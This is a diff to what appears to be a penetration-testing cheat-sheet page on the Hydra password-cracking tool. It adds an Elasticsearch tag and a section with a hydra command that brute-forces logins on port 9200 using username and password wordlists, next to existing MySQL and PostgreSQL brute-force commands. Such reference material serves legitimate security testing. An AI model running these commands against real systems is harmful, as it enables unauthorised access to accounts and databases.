@@ -1,7 +1,7 @@
 ---
 title: Hydra
 desc: Cracks username and password in web form, SSH, FTP.
-tags: [BruteForce, Cryptography, Database, FTP, Linux, Password, RDP, SMB, SNMP, SSH, Web]
+tags: [BruteForce, Cryptography, Database, Elasticsearch, FTP, Linux, Password, RDP, SMB, SNMP, SSH, Web]
 alts: [CrackStation, Hashcat, JohnTheRipper, Wfuzz]
 website:
 render_with_liquid: false
@@ -15,6 +15,14 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 mysql
 
 # PostgreSQL
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 postgres
+```
+
+<br />
+
+## Elasticsearch
+
+```sh
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst 10.0.0.1 -s 9200 http-get /
 ```
 
 <br />
